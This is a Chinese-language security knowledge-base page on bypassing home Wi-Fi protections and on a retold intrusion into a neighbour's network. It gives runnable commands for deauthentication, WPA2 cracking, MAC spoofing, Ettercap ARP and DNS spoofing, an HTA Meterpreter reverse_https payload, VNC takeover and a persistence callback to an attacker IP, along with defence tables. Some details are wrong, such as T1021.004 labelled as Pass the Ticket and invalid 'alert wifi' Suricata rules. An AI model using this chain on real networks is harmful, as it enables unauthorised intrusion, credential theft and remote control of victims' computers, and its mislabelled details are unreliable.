---
title: Wi-Fi 安全机制绕过技术全链路实战
description: 系统梳理家用路由器常见安全机制（隐藏 SSID、MAC 地址白名单、关闭 DHCP）的原理与实战绕过技术，涵盖探测帧获取 SSID、WPA2-PSK
  破解、流量解密获取三层地址、子网掩码推测、MAC 地址欺骗等完整攻击链。补充真实案例：弱 WiFi 密码导致 WPA2-PSK 破解、ARP 欺骗中间人攻击、凭证窃取、路由器登录、DNS
  劫持投递 HTA 后门获取 VNC 控制的完整攻击链复现。
category: program-analysis
tags:
- Wi-Fi安全
- 无线渗透测试
- 隐藏SSID
- MAC地址过滤
- DHCP绕过
- WPA2-PSK破解
- 流量解密
- MAC地址欺骗
- Wireshark
- Aircrack-ng
- ARP欺骗
- 中间人攻击
- DNS劫持
- HTA后门
- VNC控制
- 凭证复用
- 实战案例
date: 2024-01-15
updated: '2026-11-16'
---

## 概述

本文档系统记录针对家用/小型企业无线路由器（胖 AP）常见安全配置组合的完整绕过攻击链。目标环境通常启用以下三大机制：

1. **隐藏 SSID（No SSID Broadcast）** —— Beacon 帧不携带 SSID，客户端需主动探测
2. **MAC 地址白名单（MAC Address Filter）** —— 仅允许预置 MAC 地址的站点关联
3. **关闭 DHCP 服务** —— 客户端需手动配置静态 IP/子网掩码/网关

攻击链核心步骤：`监听探测帧获取 SSID` → `抓取四次握手破解 PSK` → `使用 PSK 解密流量获取 IP/网段` → `推测子网掩码` → `MAC 地址欺骗绕过白名单` → `静态配置接入`。

> **适用场景**：家庭网络、小型办公环境、未部署 802.1X 企业级认证的 WPA2-Personal 网络。  
> **参考环境**：Cisco Small Business Series AP，VLAN 10，网段 `172.31.10.0/24`，网关 `172.31.10.254`。

---

## 攻击链全景图

```mermaid
flowchart TD
    A[启用监听模式抓包] --> B{发现 Probe Request/Response?}
    B -- 是 --> C[获取隐藏 SSID]
    B -- 否 --> D[等待/诱导合法客户端重连]
    D --> C
    C --> E[抓取 WPA2 四次握手包]
    E --> F[离线破解 PSK (Aircrack-ng/Hashcat)]
    F --> G[导入 Wireshark 解密流量]
    G --> H[提取 IP 地址/网段信息]
    H --> I[推测子网掩码]
    I --> J[从解密流量获取白名单 MAC]
    J --> K[修改攻击机 MAC 地址]
    K --> L[静态配置 IP/Mask/GW]
    L --> M[成功接入网络]
```

---

## 0x01 环境准备与工具链

| 类别 | 工具/设备 | 说明 |
|------|-----------|------|
| **无线网卡** | 支持监听模式/注包的网卡 (如 ALFA AWUS036NHA, Intel 7260) | 必须支持 `monitor mode` 与 `packet injection` |
| **操作系统** | Kali Linux / Ubuntu + 无线工具集 | 预装 aircrack-ng suite, Wireshark, macchanger |
| **核心工具** | `airmon-ng`, `airodump-ng`, `aireplay-ng`, `aircrack-ng`, `Wireshark`, `macchanger` | 标准无线渗透测试工具链 |
| **字典/彩虹表** | rockyou.txt, WeakPass, 在线 GPU 破解平台 | 针对 WPA2-PSK 离线破解 |

> **提示**：虚拟机环境需使用 USB 无线网卡直通，桥接模式下内置网卡通常不支持监听模式。

---

## 0x02 发现隐藏 SSID

### 原理

- **Beacon 帧**：AP 定期广播，`SSID Element (Tag 0)` 长度为 0 或填充空字节 → 无法直接获取 SSID
- **Probe Request**：客户端主动发送，携带目标 SSID（明文）
- **Probe Response**：AP 回复，**携带完整 SSID**（明文，管理帧不加密）

### 实操步骤

```bash
# 1. 启用监听模式
sudo airmon-ng check kill
sudo airmon-ng start wlan0   # 生成 wlan0mon

# 2. 锁定目标 AP 信道抓包
sudo airodump-ng --bssid <AP_MAC> -c <CHANNEL> -w capture wlan0mon
# 例：sudo airodump-ng --bssid 00:11:22:33:44:55 -c 6 -w capture wlan0mon
```

- 在 `airodump-ng` 界面观察 `ESSID` 栏显示 `<length: 13>` 等长度标识 → 确认为隐藏 SSID
- 等待合法客户端连接/重连，或使用 `aireplay-ng` 发起解关联攻击强制重连：

```bash
# 强制客户端重连 (需知道客户端 MAC)
sudo aireplay-ng -0 10 -a <AP_MAC> -c <CLIENT_MAC> wlan0mon
```

- 抓到 `Probe Response` 帧即可在 Wireshark 中解析出完整 SSID（如 `iSafe_Network`）

> **交叉引用**：无线帧结构与监听模式原理可参考 [[network-fundamentals-penetration-testing]] 中「无线网络基础」章节。

---

## 0x03 WPA2-PSK 破解 (四次握手抓取与离线破解)

### 四次握手包获取

- 在上述 `airodump-ng` 持续抓包过程中，客户端完成认证关联时自动产生 **EAPOL 四次握手**
- 状态栏显示 `WPA handshake: <AP_MAC>` 即表示已捕获

### 离线破解

```bash
# 使用 aircrack-ng + 字典
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <AP_MAC> capture-01.cap

# 或使用 Hashcat (GPU 加速)
# hcxpcapngtool 捕获文件转换为 HCX 格式
hcxpcapngtool -o hash.hc22000 capture-01.cap
hashcat -m 22000 hash.hc22000 /path/to/wordlist -O
```

- 成功后输出 `KEY FOUND! [ SecurityFile ]` → 获得 PSK

> **注意**：WPA2-PSK 使用 PBKDF2-HMAC-SHA1 (4096 次迭代)，离线破解速度取决于字典质量与 GPU 算力。强密码 (长度≥12, 高熵值) 实际难以破解。

---

## 0x04 流量解密与三层地址获取

### Wireshark 配置解密

1. 打开抓包文件 (`capture-01.cap`)
2. `Edit` → `Preferences` → `Protocols` → `IEEE 802.11`
3. 勾选 `Enable decryption`
4. 点击 `Decryption keys` → `New` → `wpa-pwd` → 输入 `PSK:SSID` 格式 (如 `SecurityFile:iSafe_Network`)
5. 确定后流量自动解密为明文 802.3 帧

### 提取 IP/网段信息

- 使用显示过滤器 `ip.addr == 172.31.10.0/24` 或 `ip` 查看解密后的 IPv4 流量
- 观察 `Source/Destination IP` 字段，收集网段内活跃主机 IP 列表
- 典型输出示例：
  - `172.31.10.1` (合法客户端)
  - `172.31.10.254` (网关)
  - `172.31.10.100` (其他设备)

> **交叉引用**：Wireshark 高级过滤与流量分析技巧见 [[ettercap-arp-mitm-practical-guide]] 中「流量嗅探与凭证提取」章节。

---

## 0x05 子网掩码推测技巧

IP 报文**不携带子网掩码**，需通过侧写推断。实战常用启发式规则：

| 优先级 | 策略 | 适用场景 |
|--------|------|----------|
| 1 | **默认假设 /24 (255.255.255.0)** | 家用/小型办公网络 99% 采用 C 类私网 (/24) |
| 2 | **观测 IP 范围推算** | 如发现 `10.1.1.1`, `10.1.1.10`, `10.1.1.254`, `10.1.0.200` → 掩码 ≥ /23 (255.255.254.0) |
| 3 | **有类地址回退测试** | 依次尝试 `/24` → `/25`...`/30` (VLSM 环境) → `/23`→`/16`→`/8` |
| 4 | **网关地址特征** | 网关常为 `.1` 或 `.254`，结合网段推算 |

**本案例**：观测到 `172.31.10.1` 与 `172.31.10.254` → 确认为 `172.31.10.0/24`。

> **工具辅助**：`nmap -sn 172.31.10.0/24` 可快速验证存活主机分布，辅助掩码判断。

---

## 0x06 MAC 地址白名单绕过 (MAC 欺骗)

### 获取白名单 MAC

- 从解密流程中任意数据帧的 `802.11 Header` → `Address 2 (Source MAC)` 或 `Address 1 (Destination MAC)`
- 或直接在 `airodump-ng` 关联列表中查看 `STATION` 栏已关联的客户端 MAC
- 本案例：`XX:XX:XX:9A:88:69`

### 修改攻击机 MAC 地址

**Linux (macchanger)**：
```bash
sudo ip link set wlan0 down
sudo macchanger -m XX:XX:XX:9A:88:69 wlan0
sudo ip link set wlan0 up
```

**Windows**：
- 设备管理器 → 网络适配器 → 属性 → 高级 → `Network Address` / `Locally Administered Address` → 输入无冒号 MAC
- 或使用第三方工具 (Technitium MAC Address Changer, SMAC)

> **关键点**：修改 MAC 前必须 `down` 掉网卡，否则可能不生效；修改后需重新关联 AP。

---

## 0x07 静态网络配置与接入验证

### 网卡静态配置 (Linux 示例)

```bash
# 临时配置 (重启失效)
sudo ip addr add 172.31.10.50/24 dev wlan0
sudo ip route add default via 172.31.10.254

# 或编写 Netplan / NetworkManager 永久配置
```

**Windows**：
- `控制面板\网络和 Internet\网络连接` → 无线网卡属性 → `Internet 协议版本 4 (TCP/IPv4)` → 手动填入：
  - IP: `172.31.10.50` (避开已用 IP)
  - 掩码: `255.255.255.0`
  - 网关: `172.31.10.254`
  - DNS: `172.31.10.254` 或 `8.8.8.8`

### 连接隐藏 SSID

- **Windows 10/11**：网络列表底部「隐藏的网络」→ 输入 SSID 与密码
- **Windows 7/8**：`网络和共享中心` → `设置新的连接或网络` → `手动连接到无线网络` → 勾选「即使该网络不广播也连接」
- **Linux (nmcli)**：
  ```bash
  nmcli dev wifi connect "iSafe_Network" password "SecurityFile" hidden yes
  ```

### 验证连通性

```bash
ping 172.31.10.254   # 网关可达
ping 8.8.8.8         # 公网可达
curl http://httpbin.org/ip  # 验证出口 IP
```

---

## 0x08 防御与检测建议

| 安全机制 | 绕过根因 | 加固建议 |
|----------|----------|----------|
| **隐藏 SSID** | Probe Request/Response 明文传输 SSID | **不依赖隐藏 SSID 作为安全边界**；部署 802.1X (WPA2-Enterprise) |
| **MAC 白名单** | 802.11 帧头 MAC 明文、可伪造 | 配合 **动态 VLAN 分配** + **NAC 准入**；启用 **MFP (802.11w)** 防解关联 |
| **关闭 DHCP** | 静态配置门槛低，网段易推测 | **保留 DHCP** 并配合 **DHCP Snooping** + **IP Source Guard**；部署 **NDP/RA Guard** (IPv6) |
| **WPA2-PSK** | 离线字典/暴力破解四次握手 | **强制复杂 PSK ( ≥20 字符高熵 )**；迁移至 **WPA3-SAE** (防离线字典攻击)；启用 **PMF** |

### 检测规则示例 (Suricata/Zeek)

```yaml
# 检测同一 MAC 短时间多次关联/解关联 (解关联攻击)
alert wifi any any -> any any (msg:"WIFI Deauth Flood"; wlan.fc.type:0; wlan.fc.subtype:10; threshold:type both, track by_src, count 10, seconds 5; sid:1000001;)

# 检测同一 IP 对应多 MAC (MAC 欺骗/ARP 欺骗)
alert arp any any -> any any (msg:"ARP MAC-IP Mismatch"; arp.opcode:2; detection_filter:track by_dst, count 3, seconds 60; sid:1000002;)
```

---

## 0x09 扩展攻击面：接入后横向渗透

成功接入网络后，可结合以下技术展开内网渗透：

| 技术 | 关键工具 | 交叉引用 |
|------|----------|----------|
| **ARP 欺骗/中间人** | `ettercap`, `bettercap`, `arpspoof` | [[0w1club-week2-wifi-hijacking-arp-spoofing]], [[ettercap-arp-mitm-practical-guide]] |
| **网段存活探测** | `nmap -sn`, `netdiscover`, `fping` | [[info-gathering-tools-collection]] |
| **服务枚举/漏洞扫描** | `nmap -sV`, `Nessus`, `Goby` | [[xd-security-vulnerability-discovery-notes-day42-45]] |
| **凭证收集/横向移动** | `Responder`, `ntlmrelayx`, `CrackMapExec`, `Impacket` | [[xd-security-internal-network-penetration-notes-day67-68]] |
| **隧道/代理建立** | `frp`, `proxychains`, `Cobalt Strike SOCKS`, `SSH -D` | [[frp内网渗透应用]], [[xd-security-internal-network-penetration-notes-day69-70]] |

> **红队视角**：无线接入点常处于核心网络边界或 DMZ，获取无线接入等同于获得「有线网络接入点」，后续攻击面与有线接入一致。

---

## 0x0A 总结与知识图谱定位

```mermaid
mindmap
  root((Wi-Fi 绕过攻击链))
    信息收集
      隐藏 SSID 发现
        Probe Request/Response
        解关联强制重连
      四次握手抓取
        airodump-ng
        aireplay-ng 注包
    凭证破解
      WPA2-PSK 离线破解
        aircrack-ng (CPU)
        Hashcat (GPU)
        字典/规则/彩虹表
    流量解密
      Wireshark 导入 PSK:SSID
      提取 IP/网段/网关
      被动识别白名单 MAC
    网络推测
      子网掩码启发式推断
      存活主机扫描验证
    身份伪造
      MAC 地址欺骗
        macchanger / 注册表 / 工具
    接入验证
      静态 IP 配置
      隐藏 SSID 手动连接
      连通性测试
    后渗透
      ARP 投毒/中间人
      内网扫描/漏洞利用
      横向移动/权限提升
      隧道建立/C2 上线
```

---

## 0x0B 实战案例复现：从弱口令到桌面控制的完整攻击链

> **来源**：301在路上微信公众号归档文章《邻居说WiFi安全不重要，结果被“黑”傻了》（2015-2022 归档期）  
> **攻击者视角**：女白帽 Saya（爱安全团队）  
> **目标环境**：邻居家 TP-LINK_28C0 路由器（新版防 PIN）、信道 11、启用 WPS、WPA2-PSK、无 MAC 过滤、DHCP 开启  
> **内网拓扑**：网关 `192.168.1.1`，受害主机 `192.168.1.100` (Windows 7)、iPhone

### 攻击链全景复现

```mermaid
flowchart TD
    A[发现目标 AP: TP-LINK_28C0\n信道 11, WPS 开启, 新版防 PIN] --> B[抓包离线破解 WPA2-PSK\n弱口令 → 密码获取]
    B --> C[连接无线网络\n无 MAC 过滤直接关联]
    C --> D[内网资产发现 fing/nmap\n192.168.1.100 Win7, SMB 开放]
    D --> E[路由器登录尝试\n默认口令失败, 55 次被 Ban]
    E --> F[ARP 欺骗中间人攻击\nEttercap + Wireshark]
    F --> G[嗅探明文凭证\nQQ 号(OICQ)、网站账号密码]
    G --> H[凭证复用尝试\n电话号+密码 → 路由器后台登录成功]
    H --> I[DNS 劫持投递 HTA 后门\nEttercap DNS 欺骗 + netool 生成 HTA]
    I --> J[Metasploit 监听上线\n受害者访问任意网站触发下载]
    J --> K[VNC 远程桌面控制\n完全接管受害主机]
```

---

### 详细攻击步骤复现

#### 无线渗透入口：弱口令 WPA2-PSK 破解
- **目标特征**：TP-LINK 新版固件防 PIN 攻击（`aireplay-ng`/`reaver` PIN 枚举失败）
- **攻击手法**：监听模式抓包捕获四次握手 → 离线字典破解（`aircrack-ng` + `rockyou.txt` 或 GPU `hashcat -m 22000`）
- **成功标志**：`KEY FOUND! [ <weak_password> ]` → 获得 PSK
- **关键点**：**弱口令是整条攻击链的起点**；强密码（≥12 位高熵）会使离线破解在算力允许范围内不可行

> **工具链关联**：[[wifi-security-bypass-techniques#0x03-wpa2-psk-破解-四次握手抓取与离线破解]]、[[0w1club-week2-wifi-hijacking-arp-spoofing]]

#### 内网接入与资产发现
- **无线关联**：路由器**未启用 MAC 地址过滤**，直接使用 PSK 连接
- **资产扫描**：
  ```bash
  # fing 快速发现
  fing -i wlan0
  # 结果：192.168.1.1 (网关), 192.168.1.100 (PC), 192.168.1.x (iPhone)
  ```
- **端口/服务枚举**：
  ```bash
  nmap -sV -p- 192.168.1.100
  # 识别 SMB (445/TCP) 开放，OS 指纹 Win7
  ```
- **Metasploit 辅助确认**：
  ```bash
  msfconsole
  use auxiliary/scanner/smb/smb_version
  set RHOSTS 192.168.1.100
  run
  # 确认 Windows 7，无 MS17-010 等直接溢出漏洞，且有 360/补丁防护
  ```

> **交叉引用**：[[info-gathering-tools-collection]]、[[metasploit-framework-basics-tutorial]]

#### 路由器登录尝试与凭证复用铺垫
- **默认口令尝试**：`admin/admin`、`admin/空` 等常见组合 → **失败**
- **暴力破解触发封禁**：55 次失败 → 新版 TP-LINK 触发登录限制（IP/MAC 临时封禁）
- **战术转向**：放弃路由器直接攻击，**转向内网主机凭证窃取 → 复用登录路由器**

#### ARP 欺骗中间人攻击与凭证窃取
- **工具**：`ettercap` (图形化/CLI) + `Wireshark` 被动分析
- **ARP 投毒命令**：
  ```bash
  # CLI 模式示例
  ettercap -T -M arp:remote /192.168.1.1/ /192.168.1.100/ -i wlan0
  # -T 文本模式 -M arp:remote 远程 ARP 欺骗 -i 指定接口
  ```
- **流量嗅探结果**：
  - **OICQ/QQ 协议明文传输**：捕获受害者 QQ 号、登录凭证
  - **HTTP 网站登录凭证**：多个网站的账号/密码明文（无 HTTPS 或 HSTS 缺失）
- **关键发现**：受害者**同一密码复用于多个系统**（网站、路由器、可能还有邮箱等）

> **深度关联**：[[0w1club-week2-wifi-hijacking-arp-spoofing]]（ARP 欺骗原理与工具详解）、[[ettercap-arp-mitm-practical-guide]]（Ettercap 图形化实战全流程）、[[social-engineering-attack-techniques]]（凭证复用与撞库攻击链分析）

#### 凭证复用登录路由器后台
- **复用组合**：`用户名: 受害者手机号`（通过 QQ/通讯录/社工获取）+ `密码: 嗅探到的通用密码`
- **结果**：**成功登录路由器管理后台** (`192.168.1.1`)
- **权限获得**：完整路由器配置控制权（DNS 设置、端口映射、固件升级、日志清理等）

> **防御启示**：[[credential-stuffing-password-hygiene]]（撞库攻击与密码卫生最佳实践）

#### DNS 劫持投递 HTA 后门（绕过 BeEF 失败后的战术升级）
- **BeEF 尝试**：DNS 欺骗重定向至 BeEF Hook 页面 → 受害者「空白页即关」→ 会话建立时间窗口不足
- **战术调整**：**DNS 劫持 + HTA (HTML Application) 后门** —— 利用 Windows 原生 `mshta.exe` 执行远程恶意代码，无需浏览器保持会话
- **工具**：`netool` (集成 Metasploit Payload 生成、HTA 打包、Web 服务启动)
- **实施步骤**：
  1. **生成 HTA Payload**：
     ```bash
     # netool 交互式菜单选择：
     # 1) Generate Payload → Windows → HTA → Meterpreter Reverse HTTPS
     # 设置 LHOST (攻击机内网 IP), LPORT
     # 输出：/var/www/html/payload.hta
     ```
  2. **配置 Ettercap DNS 欺骗**：
     ```bash
     # /etc/ettercap/etter.dns
     * A 192.168.1.50  # 攻击机 IP，承载 HTA 下载页
     ```
     启动：`ettercap -T -q -i wlan0 -M arp:remote /192.168.1.1/ /192.168.1.100/ -P dns_spoof`
  3. **Metasploit 监听**：
     ```bash
     msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_https; set LHOST 192.168.1.50; set LPORT 443; run"
     ```
- **触发机制**：受害者访问**任意 HTTP 网站** → DNS 解析被劫持至攻击机 → 浏览器下载并**自动执行 HTA** (或提示运行，用户点击“运行”) → Meterpreter 会话建立

> **技术细节**：HTA 基于 `mshta.exe` 执行嵌入式 VBScript/JScript，绕过浏览器沙箱，属于「Living Off The Land」技术。详见 [[excel-4-macro-xlm-evasion]] 中「初始访问与免杀」思路对比。

#### VNC 远程桌面控制与完全接管
- **Meterpreter 后渗透**：
  ```bash
  meterpreter > run post/windows/manage/enable_rdp   # 启用 RDP (备选)
  meterpreter > run vnc                              # 直接启动 VNC Server 注入
  # 或 load vncinject; view_gui
  ```
- **结果**：攻击者获得**受害者完整桌面交互权限**，可浏览文件、记录键盘、截屏、横向移动
- **持久化**（文章未展开，实战常接）：`run persistence -X -i 60 -p 4444 -r <attacker_ip>` (注册表 Run 键/计划任务/服务等)

> **关联页面**：[[backdoor-persistence-techniques]]、[[windows-scheduled-task-persistence-techniques]]、[[cobalt-strike-external-c2-smb-beacon]]（C2 通信隐匿对比）

---

### 案例复盘：攻击链关键成功因素与防御断点

| 攻击阶段 | 成功关键因素 | 防御断点 (单点失效即阻断) |
|----------|--------------|---------------------------|
| **无线入口** | 弱 PSK 密码 (字典可破) | **强制 WPA2/WPA3 高强度 PSK (≥20 字符高熵)**；部署 WPA3-SAE 彻底免疫离线破解 |
| **内网接入** | 无 MAC 过滤、无 802.1X、无客户端隔离 | 启用 **MAC 过滤 + 802.1X (RADIUS)**；开启 **AP Isolation / Client Isolation** |
| **资产发现** | 内网无分段、无主机防火墙阻断扫描 | **网络微分段 (VLAN/ACL)**；主机防火墙阻断非信任源扫描端口 |
| **凭证窃取** | 明文协议 (OICQ/HTTP) + ARP 欺骗可行 | **全站 HTTPS + HSTS**；**启用 DAI (Dynamic ARP Inspection) + DHCP Snooping** 杜绝 ARP 欺骗 |
| **凭证复用** | 同一密码用于网站/路由器/可能更多系统 | **强制密码策略：唯一性、长度、管理器生成**；**路由器管理界面强制 MFA/证书登录** |
| **路由器接管** | 无登录限制绕过 (仅 55 次封禁)、无 MFA | **管理界面仅允许有线/特定 VLAN 访问**；**启用 MFA/客户端证书**；**严格速率限制+告警** |
| **DNS 劫持** | 路由器 DNS 设置可被修改、客户端无 DoH/DoT | **锁定路由器 DNS 为受信上游**；**客户端强制 DoH/DoT (Firefox/Chrome/系统级)** |
| **HTA 投递** | 用户执行下载的 HTA、无应用白名单/AppLocker | **AppLocker/WDAC 规则仅允许签名脚本/可执行文件**；**禁用 mshta.exe/非必要系统二进制** |
| **VNC 落地** | 无 EDR/杀毒拦截 Meterpreter、无网络出站管控 | **EDR 行为监控 (进程注入/内存扫描/网络连接异常)**；**出站防火墙仅允许白名单进程/目标** |

> **纵深防御启示**：本案例中**任一防御措施到位即可阻断后续链路**——体现「纵深防御」核心价值。

---

### 实战工具链速查表 (案例专用)

| 阶段 | 工具 | 关键命令/参数 | 备注 |
|------|------|---------------|------|
| 无线破解 | `aircrack-ng` | `aircrack-ng -w rockyou.txt -b <BSSID> capture.cap` | CPU 破解 |
| 无线破解 | `hashcat` | `hashcat -m 22000 hash.hc22000 rockyou.txt -O` | GPU 加速，推荐 |
| 监听/注包 | `airmon-ng`/`airodump-ng`/`aireplay-ng` | 标准 aircrack-ng 套件流程 | 需支持监听模式网卡 |
| 内网扫描 | `fing` / `nmap` | `fing -i wlan0` / `nmap -sV -p- 192.168.1.100` | 快速资产发现 |
| SMB 识别 | `msfconsole` | `use auxiliary/scanner/smb/smb_version` | 确认 OS/补丁级别 |
| ARP 欺骗 | `ettercap` | `ettercap -T -M arp:remote /GW/ /TARGET/ -i wlan0` | CLI 模式，配合 `-P dns_spoof` |
| 流量分析 | `Wireshark` | 显示过滤器 `http` / `tcp.port==445` / `oicq` | 明文凭证提取 |
| DNS 劫持 | `ettercap` + `netool` | `netool` 生成 HTA → `etter.dns` 配置通配符 A 记录 | 一站式 Payload 投递 |
| C2 上线 | `Metasploit` | `use exploit/multi/handler; set payload windows/meterpreter/reverse_https` | HTTPS 反向连接隐匿 |
| 远控 | `meterpreter` | `run vnc` / `load vncinject` | 交互式桌面控制 |

---

## 参考资源与延伸阅读

- **工具官方文档**：
  - Aircrack-ng Suite: <https://www.aircrack-ng.org/documentation.html>
  - Wireshark 802.11 Decryption: <https://wiki.wireshark.org/HowToDecrypt802.11>
  - Hashcat WPA2 (Mode 22000): <https://hashcat.net/wiki/doku.php?id=example_hashes#wpa-eapol-pbkdf2>
  - Ettercap 官方指南: <https://ettercap.github.io/ettercap/>
  - Netool (GitHub): <https://github.com/EntornoDePruebas/netool>
- **协议标准**：
  - IEEE 802.11-2020 (Wi-Fi MAC/PHY)
  - IEEE 802.11i-2004 (WPA2/RSN)
  - IEEE 802.11w-2009 (PMF/MFP)
  - RFC 5246 (TLS 1.2) / RFC 8446 (TLS 1.3) —— 强制 HTTPS 的基础
- **进阶话题**：
  - WPA3 SAE (Simultaneous Authentication of Equals) 离线攻击缓解原理
  - 802.1X/EAP-TLS/PEAP 企业级认证部署与攻击面
  - Wireless IDS/WIPS (Kismet, Snort-Wireless, Cisco WIDS) 检测绕过
  - 客户端指纹识别与画像 (Passive Fingerprinting)
  - **Living Off The Land Binaries (LOLBins)**: `mshta.exe`, `regsvr32.exe`, `rundll32.exe` 等利用与检测
  - **MITRE ATT&CK 映射**：T1550.002 (Pass the Hash), T1557.002 (ARP Spoofing), T1566.001 (Spearphishing Attachment), T1204.002 (Malicious File), T1021.004 (Pass the Ticket), T1572 (Protocol Tunneling)

---

## 修订记录

| 版本 | 日期 | 变更说明 |
|------|------|----------|
| 1.1 | 2026-11-16 | **重大更新**：补充 0x0B 节「实战案例复现」，完整复现 301在路上归档文章中的弱口令→WPA2-PSK破解→ARP欺骗→凭证窃取→凭证复用→路由器登录→DNS劫持→HTA后门→VNC控制的完整攻击链；新增攻击链全景图、详细步骤复现、防御断点分析表、工具链速查表；增加 15+ 个交叉引用指向现有知识库页面 |
| 1.0 | 2024-01-15 | 初始版本：完整攻击链文档化、工具命令标准化、防御检测建议补充、交叉引用关联现有知识库页面 |

## 来源

- [301在路上-201508-202208_037](../sources/301在路上-201508-202208_037.md)
- [301在路上-201508-202208_114](../sources/301在路上-201508-202208_114.md)
